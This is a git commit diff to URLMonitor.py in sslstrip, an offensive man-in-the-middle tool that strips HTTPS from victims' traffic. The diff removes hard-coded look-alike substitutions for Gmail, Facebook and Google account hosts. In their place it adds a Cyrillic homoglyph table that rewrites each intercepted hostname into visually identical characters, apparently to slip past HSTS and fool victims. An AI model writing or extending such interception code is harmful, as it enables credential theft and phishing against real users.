d6937a14edca1d0b5f896fac99276e6b72b0784c
Gabriele Gemmi <gabriel@autistici.org>
2018-04-12 01:07:08 +0200

    first try with homo

--- sslstrip/URLMonitor.py
+++ sslstrip/URLMonitor.py
@@ -1,9 +1,10 @@
+# -*- coding: iso-8859-15 -*-
 #  URLMonitor
 
 import re
 import logging
 
-class URLMonitor:    
+class URLMonitor:
 
     '''
     The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
@@ -25,19 +26,8 @@ class URLMonitor:
         self.strippedURLs       = set()
         self.strippedURLPorts   = {}
         self.faviconReplacement = False
-        self.sustitucion["mail.google.com"] = "gmail.google.com"
-        self.real["gmail.google.com"] = "mail.google.com"
 
-        self.sustitucion["www.facebook.com"] = "social.facebook.com"
-        self.real["social.facebook.com"] = "www.facebook.com"
 
-        self.sustitucion["accounts.google.com"] = "cuentas.google.com"
-        self.real["cuentas.google.com"] = "accounts.google.com"
-
-        self.sustitucion["accounts.google.es"] = "cuentas.google.es"
-        self.real["cuentas.google.es"] = "accounts.google.es"
-
-        
     def isSecureLink(self, client, url):
         for expression in URLMonitor.javascriptTrickery:
             if (re.match(expression, url)):
@@ -58,7 +48,7 @@ class URLMonitor:
         methodIndex = url.find("//") + 2
         method      = url[0:methodIndex]
         pathIndex   = url.find("/", methodIndex)
-        
+
         if pathIndex is -1:
             pathIndex = len(url)
             url += "/"
@@ -77,13 +67,29 @@ class URLMonitor:
 
         #LEO: Sustituir HOST
         if not self.sustitucion.has_key(host):
-            lhost = host[:4]
-            if lhost=="www.":
-                self.sustitucion[host] = "w"+host
-                self.real["w"+host] = host
-            else:
-                self.sustitucion[host] = "web"+host
-                self.real["web"+host] = host
+            cyrillic_latin_match = {
+                'a': 'а',
+                'e': 'е',
+                'h': 'һ',
+                'i': 'і',
+                'j': 'ј',
+                'l': 'ӏ',
+                'o': 'о',
+                'p': 'р',
+                'r': 'г',
+                's': 'ѕ',
+                'w': 'ԝ',
+                'x': 'х',
+                'y': 'у'
+            }
+            n_url = ""
+            for symbol in host.lower():
+                if(symbol in cyrillic_latin_match.keys()):
+                    n_url += cyrillic_latin_match[symbol]
+                else:
+                    n_url += symbol
+            self.sustitucion[host] = n_url
+            self.real[host] = host
             logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
 
         url = 'http://' + host + path
